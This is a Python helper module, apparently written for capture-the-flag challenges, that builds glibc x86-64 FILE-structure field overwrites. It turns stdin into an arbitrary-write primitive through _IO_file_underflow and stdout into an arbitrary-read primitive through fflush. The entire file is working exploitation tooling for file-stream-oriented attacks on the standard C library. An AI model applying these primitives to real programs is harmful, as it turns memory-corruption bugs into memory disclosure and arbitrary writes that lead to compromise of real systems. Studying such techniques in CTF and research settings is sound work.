"""glibc x86-64 standard FILE field patches.

This module only builds field patches. The caller remains responsible for
writing them through the challenge primitive and for triggering stdio.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Iterable


FILE_SIZE = 0xD8
PTR_SIZE = 8
FILENO_SIZE = 4
FLAGS_SIZE = 4

_IO_FLAGS = 0x00
_IO_READ_BASE = 0x08
_IO_READ_PTR = 0x10
_IO_READ_END = 0x18
_IO_WRITE_BASE = 0x20
_IO_WRITE_PTR = 0x28
_IO_WRITE_END = 0x30
_IO_BUF_BASE = 0x38
_IO_BUF_END = 0x40
_FILENO = 0x70

_IO_NO_READS = 0x0004
_IO_EOF_SEEN = 0x0010


@dataclass(frozen=True)
class FieldPatch:
    """One little-endian write into a FILE object."""

    offset: int
    data: bytes
    field: str

    @property
    def end(self) -> int:
        return self.offset + len(self.data)


def _check_range(name: str, value: int, *, minimum: int = 0) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < minimum:
        raise ValueError(f"{name} must be >= {minimum:#x}")


def _pack_ptr(value: int, name: str) -> bytes:
    _check_range(name, value)
    if value > 0xFFFFFFFFFFFFFFFF:
        raise ValueError(f"{name} does not fit in an x86-64 pointer")
    return value.to_bytes(PTR_SIZE, "little")


def _pack_fileno(value: int) -> bytes:
    _check_range("fd", value)
    if value > 0xFFFFFFFF:
        raise ValueError("fd does not fit in an unsigned 32-bit FILE field")
    return value.to_bytes(FILENO_SIZE, "little")


def _patch(offset: int, value: bytes, field: str) -> FieldPatch:
    return FieldPatch(offset=offset, data=value, field=field)


def _validate_region(target: int, length: int) -> int:
    _check_range("target", target)
    _check_range("length", length, minimum=1)
    end = target + length
    if end > 0xFFFFFFFFFFFFFFFF:
        raise ValueError("target + length overflows an x86-64 pointer")
    return end


def build_stdin_arbitrary_write(
    target: int,
    length: int,
    *,
    fd: int = 0,
    current_flags: int | None = None,
) -> tuple[FieldPatch, ...]:
    """Build the fields consumed by ``_IO_file_underflow`` for ``read``.

    ``current_flags`` is optional because a partial overwrite can preserve the
    unknown flag bits. When supplied, the returned flags patch clears
    ``_IO_NO_READS`` and ``_IO_EOF_SEEN`` while preserving every other bit.
    """

    end = _validate_region(target, length)
    _check_range("fd", fd)

    patches: list[FieldPatch] = []
    if current_flags is not None:
        _check_range("current_flags", current_flags)
        if current_flags > 0xFFFFFFFFFFFFFFFF:
            raise ValueError("current_flags does not fit in an x86-64 qword")
        flags = current_flags & ~(_IO_NO_READS | _IO_EOF_SEEN)
        patches.append(_patch(_IO_FLAGS, flags.to_bytes(FLAGS_SIZE, "little"), "_flags"))

    patches.extend(
        (
            _patch(_IO_READ_BASE, _pack_ptr(target, "target"), "_IO_read_base"),
            _patch(_IO_READ_PTR, _pack_ptr(target, "target"), "_IO_read_ptr"),
            _patch(_IO_READ_END, _pack_ptr(target, "target"), "_IO_read_end"),
            _patch(_IO_BUF_BASE, _pack_ptr(target, "target"), "_IO_buf_base"),
            _patch(_IO_BUF_END, _pack_ptr(end, "target + length"), "_IO_buf_end"),
            _patch(_FILENO, _pack_fileno(fd), "_fileno"),
        )
    )
    return tuple(patches)


def build_stdout_arbitrary_read(
    target: int,
    length: int,
    *,
    fd: int = 1,
) -> tuple[FieldPatch, ...]:
    """Build the fields consumed by ``fflush`` for ``write``."""

    end = _validate_region(target, length)
    return (
        _patch(_IO_READ_BASE, _pack_ptr(target, "target"), "_IO_read_base"),
        _patch(_IO_READ_PTR, _pack_ptr(target, "target"), "_IO_read_ptr"),
        _patch(_IO_READ_END, _pack_ptr(target, "target"), "_IO_read_end"),
        _patch(_IO_WRITE_BASE, _pack_ptr(target, "target"), "_IO_write_base"),
        _patch(_IO_WRITE_PTR, _pack_ptr(end, "target + length"), "_IO_write_ptr"),
        _patch(_IO_WRITE_END, _pack_ptr(end, "target + length"), "_IO_write_end"),
        _patch(_IO_BUF_BASE, _pack_ptr(target, "target"), "_IO_buf_base"),
        _patch(_IO_BUF_END, _pack_ptr(end, "target + length"), "_IO_buf_end"),
        _patch(_FILENO, _pack_fileno(fd), "_fileno"),
    )


def apply_patches(
    patches: Iterable[FieldPatch],
    *,
    base: bytes | bytearray | None = None,
    size: int = FILE_SIZE,
) -> bytes:
    """Serialize patches into a FILE-sized image or a caller-provided image."""

    _check_range("size", size, minimum=1)
    image = bytearray(size if base is None else base)
    if len(image) < size:
        raise ValueError("base is smaller than the requested image size")

    for patch in patches:
        if patch.offset < 0 or patch.end > len(image):
            raise ValueError(f"patch {patch.field} falls outside the image")
        image[patch.offset : patch.end] = patch.data
    return bytes(image)


def patches_by_field(patches: Iterable[FieldPatch]) -> dict[str, bytes]:
    """Return a compact field-name to encoded-value mapping for edit helpers."""

    return {patch.field: patch.data for patch in patches}
